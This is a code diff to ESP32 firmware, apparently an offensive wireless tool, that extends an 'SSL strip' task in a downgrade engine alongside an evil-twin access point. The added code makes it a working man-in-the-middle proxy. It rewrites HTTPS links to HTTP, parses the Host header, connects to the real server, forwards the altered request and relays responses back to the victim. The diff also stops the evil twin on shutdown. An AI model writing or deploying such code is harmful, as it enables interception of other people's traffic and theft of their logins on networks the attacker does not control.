@@ -3,6 +3,8 @@
 #include "storage_manager.h"
 #include "esp_log.h"
 #include "lwip/sockets.h"
+#include "lwip/netdb.h"
+#include "lwip/dns.h"
 #include <string.h>
 #include <stdlib.h>
 
@@ -37,6 +39,26 @@ esp_err_t downgrade_set_evil_twin_wpa2(const char *ssid, uint8_t channel)
 static int s_ssl_strip_fd = -1;
 static TaskHandle_t s_ssl_task = NULL;
 static volatile bool s_ssl_running = false;
+
+static int parse_host(const char *req, char *host, int host_len, int *port)
+{
+    const char *h = strstr(req, "Host:");
+    if (!h) return -1;
+    h += 5;
+    while (*h == ' ') h++;
+    int i = 0;
+    while (*h && *h != '\r' && *h != '\n' && i < host_len - 1) {
+        if (*h == ':') {
+            h++;
+            *port = 0;
+            while (*h >= '0' && *h <= '9') { *port = *port * 10 + (*h - '0'); h++; }
+            break;
+        }
+        host[i++] = *h++;
+    }
+    host[i] = '\0';
+    return 0;
+}
 
 static void ssl_strip_task(void *arg)
 {
@@ -76,24 +98,25 @@ static void ssl_strip_task(void *arg)
         int client_fd = accept(s_ssl_strip_fd, (struct sockaddr *)&client, &clen);
         if (client_fd < 0) continue;
 
-        uint8_t buf[4096];
-        int len = recv(client_fd, buf, sizeof(buf) - 1, MSG_PEEK);
+        uint8_t *buf = malloc(4096);
+        char *modified = malloc(4096);
+        if (!buf || !modified) {
+            free(buf); free(modified);
+            close(client_fd);
+            continue;
+        }
+
+        int len = recv(client_fd, buf, 4095, 0);
         if (len > 0) {
             buf[len] = '\0';
 
-            char modified[4096];
             int mlen = 0;
-
             char *src = (char *)buf;
             char *dst = modified;
 
             while (*src && mlen < 4000) {
                 if (strncasecmp(src, "https://", 8) == 0) {
                     *dst++ = 'h'; *dst++ = 't'; *dst++ = 't'; *dst++ = 'p';
-                    src += 8;
-                    mlen += 4;
-                } else if (strncasecmp(src, "HTTPS://", 8) == 0) {
-                    *dst++ = 'H'; *dst++ = 'T'; *dst++ = 'T'; *dst++ = 'P';
                     src += 8;
                     mlen += 4;
                 } else {
@@ -103,9 +126,45 @@ static void ssl_strip_task(void *arg)
             }
             *dst = '\0';
 
-            send(client_fd, modified, strlen(modified), 0);
+            char host[256];
+            int tport = 80;
+            if (parse_host(modified, host, sizeof(host), &tport) == 0 && host[0]) {
+                struct sockaddr_in target;
+                memset(&target, 0, sizeof(target));
+                target.sin_family = AF_INET;
+                target.sin_port = htons(tport > 0 ? tport : 80);
+
+                struct hostent *he = lwip_gethostbyname(host);
+                if (he) {
+                    memcpy(&target.sin_addr, he->h_addr_list[0], he->h_length);
+
+                    int target_fd = socket(AF_INET, SOCK_STREAM, 0);
+                    if (target_fd >= 0) {
+                        struct timeval conn_tv = { .tv_sec = 5, .tv_usec = 0 };
+                        setsockopt(target_fd, SOL_SOCKET, SO_RCVTIMEO, &conn_tv, sizeof(conn_tv));
+                        setsockopt(target_fd, SOL_SOCKET, SO_SNDTIMEO, &conn_tv, sizeof(conn_tv));
+
+                        if (connect(target_fd, (struct sockaddr *)&target, sizeof(target)) == 0) {
+                            send(target_fd, modified, strlen(modified), 0);
+
+                            uint8_t *resp = malloc(4096);
+                            if (resp) {
+                                int rlen, reads = 0;
+                                while ((rlen = recv(target_fd, resp, 4096, 0)) > 0 && reads < 256) {
+                                    send(client_fd, resp, rlen, 0);
+                                    reads++;
+                                }
+                                free(resp);
+                            }
+                        }
+                        close(target_fd);
+                    }
+                }
+            }
         }
 
+        free(buf);
+        free(modified);
         close(client_fd);
     }
 
@@ -125,7 +184,7 @@ esp_err_t downgrade_engine_init(downgrade_type_t types)
 
     if (types & DOWNGRADE_SSL) {
         s_ssl_running = true;
-        xTaskCreatePinnedToCore(ssl_strip_task, "ssl_strip", 4096, NULL, 5, &s_ssl_task, 0);
+        xTaskCreatePinnedToCore(ssl_strip_task, "ssl_strip", 6144, NULL, 5, &s_ssl_task, 0);
     }
 
     if (types & DOWNGRADE_TLS) {
@@ -140,6 +199,9 @@ esp_err_t downgrade_engine_init(downgrade_type_t types)
 
 esp_err_t downgrade_engine_deinit(void)
 {
+    if (s_active & DOWNGRADE_WPA3) {
+        wifi_eviltwin_stop();
+    }
     s_ssl_running = false;
     if (s_ssl_task) { vTaskDelay(pdMS_TO_TICKS(200)); s_ssl_task = NULL; }
     if (s_ssl_strip_fd >= 0) { close(s_ssl_strip_fd); s_ssl_strip_fd = -1; }
